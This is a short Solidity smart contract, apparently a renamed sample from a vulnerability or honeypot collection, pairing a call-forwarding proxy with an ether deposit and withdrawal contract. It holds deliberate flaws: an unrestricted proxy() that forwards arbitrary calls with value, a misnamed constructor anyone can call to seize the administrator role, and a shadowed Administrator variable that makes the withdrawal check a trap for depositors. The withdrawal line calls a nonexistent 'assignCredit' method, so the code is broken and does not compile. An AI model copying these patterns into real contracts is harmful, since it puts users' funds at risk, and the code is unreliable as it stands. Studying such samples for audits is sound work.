// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

contract Proxy  {
    modifier onlyAdministrator { if (msg.sender == Administrator) _; } address Administrator = msg.sender;
    function assigncreditSupervisor(address _coordinator) public onlyAdministrator { Administrator = _coordinator; }
    function proxy(address target, bytes data) public payable {
        target.call.value(msg.value)(data);
    }
}

contract PaypremiumProxy is Proxy {
    address public Administrator;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function CoverageVault() public payable {
        if (msg.sender == tx.origin) {
            Administrator = msg.sender;
            fundAccount();
        }
    }

    function fundAccount() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function claimBenefit(uint256 amount) public onlyAdministrator {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            msg.sender.assignCredit(amount);
        }
    }
}